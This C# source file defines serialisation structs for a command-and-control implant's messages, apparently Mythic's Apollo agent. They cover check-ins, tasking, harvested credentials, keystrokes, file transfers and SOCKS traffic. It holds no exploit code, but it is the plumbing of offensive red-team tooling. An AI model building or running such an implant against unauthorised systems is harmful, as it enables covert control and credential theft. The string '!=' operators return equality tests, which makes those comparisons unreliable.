using System;
using System.Runtime.Serialization;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using sCredentialType = System.String;
using sStatusMessage = System.String;
using sMessageAction = System.String;

namespace ApolloInterop.Structs
{

    namespace MythicStructs
    {
        // Profile data sent from the Mythic Server
        [DataContract]
        public struct C2ProfileData
        {
            [DataMember(Name = "name")]
            public string Name;
            [DataMember(Name = "is_p2p")]
            public bool IsP2P;
            [DataMember(Name = "parameters")]
            public Dictionary<string, string> Parameters;
        }

        public class CredentialType
        {
            private CredentialType(string value) { Value = value; }
            public string Value { get; private set; }
            public override string ToString() { return Value; }
            public static CredentialType Plaintext { get { return new CredentialType("plaintext"); } }
            public static CredentialType Certificate { get { return new CredentialType("certificate"); } }
            public static CredentialType Hash { get { return new CredentialType("hash"); } }
            public static CredentialType Key { get { return new CredentialType("key"); } }
            public static CredentialType Ticket { get { return new CredentialType("ticket"); } }
            public static CredentialType Cookie { get { return new CredentialType("cookie"); } }

            public static bool operator ==(CredentialType a, CredentialType b) { return a.Value == b.Value; }

            public static bool operator !=(CredentialType a, CredentialType b) { return a.Value != b.Value; }

            public static bool operator ==(string a, CredentialType b) { return a == b.Value; }

            public static bool operator !=(string a, CredentialType b) { return a == b.Value; }
        }

        [DataContract]
        public struct Credential
        {
            [DataMember(Name = "credential_type")]
            public string CredentialType;
            [DataMember(Name = "realm")]
            public string Realm;
            [DataMember(Name = "credential")]
            public string CredentialMaterial;
            [DataMember(Name = "account")]
            public string Account;
        }

        [DataContract]
        public struct RemovedFileInformation
        {
            [DataMember(Name = "host")]
            public string Host;
            [DataMember(Name = "path")]
            public string Path;
        }

        [DataContract]
        public struct FileInformation
        {
            [DataMember(Name = "full_name")]
            public string FullName;
            [DataMember(Name = "name")]
            public string Name;
            [DataMember(Name = "directory")]
            public string Directory;
            [DataMember(Name = "creation_date")]
            public string CreationDate;
            [DataMember(Name = "modify_time")]
            public string ModifyTime;
            [DataMember(Name = "access_time")]
            public string AccessTime;
            [DataMember(Name = "permissions")]
            public Dictionary<string, string> Permissions;
            [DataMember(Name = "extended_attributes")]
            public string ExtendedAttributes;
            [DataMember(Name = "size")]
            public int Size;
            [DataMember(Name = "owner")]
            public string Owner;
            [DataMember(Name = "group")]
            public string Group;
            [DataMember(Name = "hidden")]
            public bool Hidden;
            [DataMember(Name = "is_file")]
            public bool IsFile;
        }

        [DataContract]
        public struct FileBrowser
        {
            [DataMember(Name = "host")]
            public string Host;
            [DataMember(Name = "is_file")]
            public bool IsFile;
            [DataMember(Name = "permissions")]
            public Dictionary<string, string> Permissions;
            [DataMember(Name = "name")]
            public string Name;
            [DataMember(Name = "parent_path")]
            public string ParentPath;
            [DataMember(Name = "success")]
            public bool Success;
            [DataMember(Name = "access_time")]
            public string AccessTime;
            [DataMember(Name = "modify_time")]
            public string ModifyTime;
            [DataMember(Name = "size")]
            public int Size;
            [DataMember(Name = "files")]
            public FileInformation[] Files;
        }
        public enum EdgeDirection
        {
            SourceToDestination = 1,
            DestinationToSource,
            BiDirectional
        }

        [DataContract]
        public struct EdgeNode
        {
            [DataMember(Name = "source")]
            public string Source;
            [DataMember(Name = "destination")]
            public string Destination;
            [DataMember(Name = "direction")]
            public EdgeDirection Direction;
            [DataMember(Name = "metadata")]
            public string MetaData;
            [DataMember(Name = "action")]
            public string Action;
            [DataMember(Name = "c2_profile")]
            public string C2Profile;
        }

        [DataContract]
        public struct SocksDatagram
        {
            [DataMember(Name = "server_id")]
            public int ServerID;
            [DataMember(Name = "data")]
            public string Data;
        }

        [DataContract]
        public struct Artifact
        {
            [DataMember(Name = "base_artifact")]
            public string BaseArtifact;
            [DataMember(Name = "artifact")]
            public string ArtifactDetails;
        }

        public class StatusMessage
        {
            private StatusMessage(string value) { Value = value; }
            public string Value { get; private set; }
            public override string ToString() { return Value; }
            public static StatusMessage Success { get { return new StatusMessage("success"); } }
            public static StatusMessage Error { get { return new StatusMessage("error"); } }
            public static StatusMessage Processing { get { return new StatusMessage("processing"); } }
            public static StatusMessage Complete { get { return new StatusMessage("complete"); } }
        
            public static bool operator ==(StatusMessage a, StatusMessage b) { return a.ToString() == b.ToString(); }

            public static bool operator !=(StatusMessage a, StatusMessage b) { return a.ToString() != b.ToString();}

            public static bool operator ==(string a, StatusMessage b) { return a == b.ToString(); }

            public static bool operator !=(string a, StatusMessage b) { return a == b.ToString(); }
        }

        [DataContract]
        public struct TaskStatus
        {
            [DataMember(Name = "task_id")]
            public string TaskID;
            [DataMember(Name = "status_message")]
            public sStatusMessage StatusMessage;
            [DataMember(Name = "error")]
            public string Error;
        }

        [DataContract]
        public struct TaskResponse
        {
            [DataMember(Name = "user_output")]
            public object UserOutput;
            [DataMember(Name = "completed")]
            public bool? Completed;
            [DataMember(Name = "user")]
            public string User;
            [DataMember(Name = "window_title")]
            public string WindowTitle;
            [DataMember(Name = "keystrokes")]
            public string Keystrokes;
            [DataMember(Name = "task_id")]
            public string TaskID;
            [DataMember(Name = "status")]
            public sStatusMessage Status;
            [DataMember(Name = "edges")]
            public EdgeNode[] Edges;
            [DataMember(Name = "file_browser")]
            public FileBrowser? FileBrowser;
            [DataMember(Name = "upload")]
            public UploadMessage Upload;
            [DataMember(Name = "message_id")]
            public string MessageID;
            [DataMember(Name = "credentials")]
            public Credential[] Credentials;
            [DataMember(Name = "removed_files")]
            public RemovedFileInformation[] RemovedFiles;
            [DataMember(Name = "artifacts")]
            public Artifact[] Artifacts;
        }

        [DataContract]
        public struct DownloadRegistrationMessage
        {
            [DataMember(Name = "task_id")]
            public string TaskID;
            [DataMember(Name = "total_chunks")]
            public int TotalChunks;
            [DataMember(Name = "full_path")]
            public string FullPath;
            [DataMember(Name = "host")]
            public string Host;
            [DataMember(Name = "is_screenshot")]
            public bool IsScreenshot;
        }

        [DataContract]
        public struct DownloadProgressMessage
        {
            [DataMember(Name = "task_id")]
            public string TaskID;
            [DataMember(Name = "file_id")]
            public string FileID;
            [DataMember(Name = "chunk_num")]
            public int ChunkNumber;
            [DataMember(Name = "chunk_data")]
            public string ChunkData;
        }

        [DataContract]
        public struct Task
        {
            [DataMember(Name = "command")]
            public string Command;
            [DataMember(Name = "parameters")]
            public string Parameters;
            [DataMember(Name = "timestamp")]
            public float Timestamp;
            [DataMember(Name = "id")]
            public string ID;
        }

        public class MessageAction
        {
            private MessageAction(string value) { Value = value; }
            public string Value { get; private set; }
            public override string ToString() { return Value; }
            public static MessageAction GetTasking { get { return new MessageAction("get_tasking"); } }
            public static MessageAction PostResponse { get { return new MessageAction("post_response"); } }
            public static MessageAction CheckIn { get { return new MessageAction("checkin"); } }
            public static MessageAction Upload { get { return new MessageAction("upload"); } }
            public static MessageAction StagingRSA { get { return new MessageAction("staging_rsa"); } }
            public static MessageAction StagingDH { get { return new MessageAction("staging_dh"); } }

            public static bool operator ==(MessageAction a, MessageAction b) { return a.ToString() == b.ToString(); }

            public static bool operator !=(MessageAction a, MessageAction b) { return a.ToString() != b.ToString(); }

            public static bool operator ==(string a, MessageAction b) { return a == b.ToString(); }

            public static bool operator !=(string a, MessageAction b) { return a == b.ToString(); }
        }

        public enum IntegrityLevel
        {
            UnknownIntegrity = 0,
            LowIntegrity,
            MediumIntegrity,
            HighIntegrity,
            SystemIntegrity
        }

        [DataContract]
        public struct DelegateMessage
        {
            [DataMember(Name = "uuid")]
            public string UUID;
            [DataMember(Name = "mythic_uuid")]
            public string MythicUUID;
            [DataMember(Name = "message")]
            public string Message;
            [DataMember(Name = "c2_profile")]
            public string C2Profile;
        }

        [DataContract]
        public struct TaskingMessage
        {
            [DataMember(Name = "action")]
            public string Action;
            [DataMember(Name = "tasking_size")]
            public int TaskingSize;
            [DataMember(Name = "delegates")]
            public Dictionary<string, string>[] Delegates;
            [DataMember(Name = "responses")]
            public TaskResponse[] Responses;
            [DataMember(Name = "socks")]
            public SocksDatagram[] Socks;
        }

        [DataContract]
        public struct CheckinMessage
        {
            [DataMember(Name = "action")]
            public string Action;
            [DataMember(Name = "os")]
            public string OS;
            [DataMember(Name = "user")]
            public string User;
            [DataMember(Name = "host")]
            public string Host;
            [DataMember(Name = "pid")]
            public int PID;
            [DataMember(Name = "ip")]
            public string IP;
            [DataMember(Name = "uuid")]
            public string UUID;
            [DataMember(Name = "architecture")]
            public string Architecture;
            [DataMember(Name = "domain")]
            public string Domain;
            [DataMember(Name = "integrity_level")]
            public IntegrityLevel IntegrityLevel;
            [DataMember(Name = "external_ip")]
            public string ExternalIP;
            [DataMember(Name = "encryption_key")]
            public string EncryptionKey;
            [DataMember(Name = "decryption_key")]
            public string DecryptionKey;
            [DataMember(Name = "pub_key")]
            public string PublicKey;
            [DataMember(Name = "session_id")]
            public string SessionID;
        }

        [DataContract]
        public struct UploadMessage
        {
            [DataMember(Name = "chunk_size")]
            public int ChunkSize;
            [DataMember(Name = "file_id")]
            public string FileID;
            [DataMember(Name = "chunk_num")]
            public int ChunkNumber;
            [DataMember(Name = "full_path")]
            public string FullPath;
            [DataMember(Name = "task_id")]
            public string TaskID;
        }

        [DataContract]
        public struct MessageResponse
        {
            [DataMember(Name = "action")]
            public sMessageAction Action;
            [DataMember(Name = "id")]
            public string ID;
            [DataMember(Name = "status")]
            public sStatusMessage Status;
            [DataMember(Name = "tasks")]
            public Task[] Tasks;
            [DataMember(Name = "responses")]
            public TaskStatus[] Responses;
            [DataMember(Name = "delegates")]
            public Dictionary<string, string>[] Delegates;
            [DataMember(Name = "session_key")]
            public string SessionKey;
            [DataMember(Name = "session_id")]
            public string SessionID;
            [DataMember(Name = "total_chunks")]
            public int TotalChunks;
            [DataMember(Name = "chunk_num")]
            public int ChunkNumber;
            [DataMember(Name = "chunk_data")]
            public string ChunkData;
            [DataMember(Name = "file_id")]
            public string FileID;
            [DataMember(Name = "task_id")]
            public string TaskID;
        }
    }
}
